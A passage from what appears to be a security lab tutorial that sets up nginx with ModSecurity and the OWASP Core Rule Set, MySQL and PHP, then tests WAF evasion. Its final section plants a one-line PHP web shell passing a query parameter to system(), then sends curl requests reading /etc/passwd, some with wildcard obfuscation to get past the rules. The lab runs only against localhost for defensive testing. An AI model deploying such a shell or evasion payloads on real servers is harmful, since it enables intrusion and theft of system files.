<h3>8.21.4.2. Add in the OWASP CRS<a class="headerlink" href="#add-in-the-owasp-crs" title="Permalink to this headline">Â¶</a></h3>
<p><a class="reference external" href="https://www.nginx.com/resources/admin-guide/nginx-plus-modsecurity-waf-owasp-crs/">Using the OWASP CRS with the NGINX Plus with ModSecurity WAF</a></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Download OWASP</span>
</span><span class="nb">cd</span> ~/waf
wget -4 https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.0.2.tar.gz
tar -xzvf v3.0.2.tar.gz
mv owasp-modsecurity-crs-3.0.2 /usr/local
<span class="nb">cd</span> /usr/local/owasp-modsecurity-crs-3.0.2
cp crs-setup.conf.example crs-setup.conf
<span class="nb">cd</span> ~/waf

<span class="c1"># Change /etc/nginx/modsec/main.conf</span>
cat &gt; /etc/nginx/modsec/main.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s"># From https://github.com/SpiderLabs/ModSecurity/blob/master/\</span>
<span class="s"># modsecurity.conf-recommended</span>
<span class="s">#</span>
<span class="s"># Edit to set SecRuleEngine On</span>
<span class="s">Include &quot;/etc/nginx/modsec/modsecurity.conf&quot;</span>

<span class="s"># OWASP CRS v3 rules</span>
<span class="s">Include /usr/local/owasp-modsecurity-crs-3.0.2/crs-setup.conf</span>
<span class="s">Include /usr/local/owasp-modsecurity-crs-3.0.2/rules/*.conf</span>
<span class="s">EOF</span>

systemctl restart nginx

<span class="c1"># Nikto User-Agent triggers WAF</span>
curl -H <span class="s2">&quot;User-Agent: Nikto&quot;</span> http://localhost/
</pre></div>
</div>
</div>
<div class="section" id="install-and-configure-mysql">
<h3>8.21.4.3. Install and configure MySQL<a class="headerlink" href="#install-and-configure-mysql" title="Permalink to this headline">Â¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Install mysql database</span>
</span><span class="nv">PW</span><span class="o">=</span>password
apt install mysql-server -y &lt; /dev/null
<span class="c1"># change root password and answer Y</span>
<span class="o">{</span> <span class="nb">echo</span> -e <span class="s2">&quot;\n&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;Y&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PW</span><span class="s2">&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PW</span><span class="s2">&quot;</span><span class="p">;</span> yes Y<span class="p">;</span> <span class="o">}</span> <span class="p">|</span> <span class="se">\</span>
    mysql_secure_installation
<span class="c1"># Create test database and user</span>
mysql -u root -p<span class="nv">$PW</span>
CREATE DATABASE webdata<span class="p">;</span>
GRANT ALL ON webdata.* TO <span class="s1">&#39;webuser&#39;</span> IDENTIFIED BY <span class="s1">&#39;password&#39;</span><span class="p">;</span>
quit
</pre></div>
</div>
</div>
<div class="section" id="install-and-configure-php">
<h3>8.21.4.4. Install and configure PHP<a class="headerlink" href="#install-and-configure-php" title="Permalink to this headline">Â¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Install php7</span>
</span>apt install php7.0-fpm php7.0-mysql -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
apt install php7.0-curl php7.0-json php7.0-cgi -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
<span class="c1"># add nginx user to www-data (needed for nginx to contact php-fpm)</span>
usermod -a -G www-data nginx
sed -i <span class="s1">&#39;s/^;cgi.fix_pathinfo=1.*$/cgi.fix_pathinfo=0/&#39;</span> /etc/php/7.0/fpm/php.ini
systemctl restart php7.0-fpm

<span class="c1"># Configuration in /etc/nginx/conf.d/php.conf</span>
<span class="nv">HN</span><span class="o">=</span>waf-nginx
<span class="nv">CONF</span><span class="o">=</span><span class="s2">&quot;/etc/nginx/conf.d/default.conf&quot;</span>
cat &gt; /tmp/php.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">    location ~ \.php$ {</span>
<span class="s">        root   /usr/share/nginx/html;</span>
<span class="s">        fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span>
<span class="s">        include fastcgi_params;</span>
<span class="s">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span>
<span class="s">    }</span>

<span class="s">    location ~ /\.ht {</span>
<span class="s">        deny all;</span>
<span class="s">    }</span>
<span class="s">EOF</span>
sed -i <span class="s1">&#39;/# modsecurity/r /tmp/php.conf&#39;</span> <span class="nv">$CONF</span>
rm /tmp/php.conf

systemctl reload nginx

<span class="c1"># Add php database config file</span>
<span class="nv">PHPDIR</span><span class="o">=</span>/usr/share/nginx/html
cat &gt; <span class="nv">$PHPDIR</span>/config.php <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;?php</span>
<span class="s"> define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);</span>
<span class="s"> define(&#39;DB_USERNAME&#39;, &#39;webuser&#39;);</span>
<span class="s"> define(&#39;DB_PASSWORD&#39;, &#39;password&#39;);</span>
<span class="s"> define(&#39;DB_NAME&#39;, &#39;webdata&#39;);</span>
<span class="s"> ?&gt;</span>
<span class="s">EOF</span>

<span class="c1"># Add php page</span>
cat &gt; <span class="nv">$PHPDIR</span>/phptest.php <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;html&gt;</span>
<span class="s">&lt;head&gt;</span>
<span class="s">    &lt;title&gt;PHP Test&lt;/title&gt;</span>
<span class="s">&lt;/head&gt;</span>
<span class="s">    &lt;body&gt;</span>
<span class="s">    &lt;?php</span>
<span class="s">    include_once &#39;config.php&#39;;</span>

<span class="s">    echo &#39;&lt;p&gt;Hello World&lt;/p&gt;&#39;;</span>

<span class="s">    // In the variables section below, replace user and password with your own MySQL credentials as created on your server</span>
<span class="s">    $servername = DB_SERVER;</span>
<span class="s">    $username = DB_USERNAME;</span>
<span class="s">    $password = DB_PASSWORD;</span>

<span class="s">    // Create MySQL connection</span>
<span class="s">    $conn = mysqli_connect($servername, $username, $password);</span>

<span class="s">    // Check connection - if it fails, output will include the error message</span>
<span class="s">    if (!$conn) {</span>
<span class="s">        die(&#39;&lt;p&gt;Connection failed: &lt;p&gt;&#39; . mysqli_connect_error());</span>
<span class="s">    }</span>
<span class="s">    echo &#39;&lt;p&gt;Connected successfully&lt;/p&gt;&#39;;</span>
<span class="s">    ?&gt;</span>
<span class="s">&lt;/body&gt;</span>
<span class="s">&lt;/html&gt;</span>
<span class="s">EOF</span>

<span class="c1"># Make sure can connect to database</span>
curl localhost/phptest.php
</pre></div>
</div>
</div>
</div>
<div class="section" id="id23">
<h2>8.21.5. WAF evasion<a class="headerlink" href="#id23" title="Permalink to this headline">Â¶</a></h2>
<div class="section" id="waf-evasion-techniques">
<h3>8.21.5.1. WAF Evasion Techniques<a class="headerlink" href="#waf-evasion-techniques" title="Permalink to this headline">Â¶</a></h3>
<p>Review <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a>.</p>
<p>Test using a PHP script running shell commands on the nginx server (which is a very dangerous thing):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Add shell command execution PHP script</span>
</span><span class="nv">PHPDIR</span><span class="o">=</span>/usr/share/nginx/html
cat &gt; <span class="nv">$PHPDIR</span>/x1y2z3.php <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;?php echo &#39;ok: &#39;; print_r($_GET[&#39;c&#39;]); echo (&#39;&lt;br \&gt;&#39;); system($_GET[&#39;c&#39;]); ?&gt;</span>
<span class="s">EOF</span>

<span class="c1"># Modify configuration to add &quot;setvar:tx.paranoia_level=...&quot;</span>
<span class="nv">CRS</span><span class="o">=</span>/usr/local/owasp-modsecurity-crs-3.0.2/crs-setup.conf
sed -i <span class="s1">&#39;$ s/&quot;$/,\\/&#39;</span> <span class="nv">$CRS</span>
<span class="nv">LEVEL</span><span class="o">=</span><span class="m">1</span>
<span class="nb">echo</span> <span class="s2">&quot;  setvar:tx.paranoia_level=</span><span class="nv">$LEVEL</span><span class="s2">\&quot;&quot;</span> &gt;&gt; <span class="nv">$CRS</span>
tail -n <span class="m">5</span> <span class="nv">$CRS</span>

systemctl restart nginx

<span class="c1"># Try paranoia levels 1-4</span>
<span class="k">for</span> l in <span class="m">1</span> <span class="m">2</span> <span class="m">3</span> <span class="m">4</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> -e <span class="s2">&quot;\n\n LEVEL </span><span class="nv">$l</span><span class="s2">&quot;</span>
  <span class="nv">LEVEL</span><span class="o">=</span><span class="nv">$l</span>
  sed -i <span class="s1">&#39;$ s/..$/&#39;</span><span class="nv">$LEVEL</span><span class="s1">&#39;&quot;/&#39;</span> <span class="nv">$CRS</span>
  systemctl restart nginx
  tail -n <span class="m">1</span> <span class="nv">$CRS</span>
  <span class="nb">echo</span> -e <span class="s2">&quot;\nLEVEL </span><span class="nv">$LEVEL</span><span class="s2"> - TRY 1\n&quot;</span>
  curl localhost/x1y2z3.php?c<span class="o">=</span>/bin/cat+/etc/passwd
  <span class="nb">echo</span> -e <span class="s2">&quot;\nLEVEL </span><span class="nv">$LEVEL</span><span class="s2"> - TRY 2\n&quot;</span>
  curl localhost/x1y2z3.php?c<span class="o">=</span>/???/c?t+/etc/passwd
  <span class="nb">echo</span> -e <span class="s2">&quot;\nLEVEL </span><span class="nv">$LEVEL</span><span class="s2"> - TRY 3\n&quot;</span>
  curl localhost/x1y2z3.php?c<span class="o">=</span>/???/c?t+/???/??ss??
<span class="k">done</span>
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="wifi.html" class="btn btn-neutral float-right" title="8.22. WiFi Tutorial" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="vulnerabilities.html" class="btn btn-neutral" title="8.20. Vulnerabilites" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>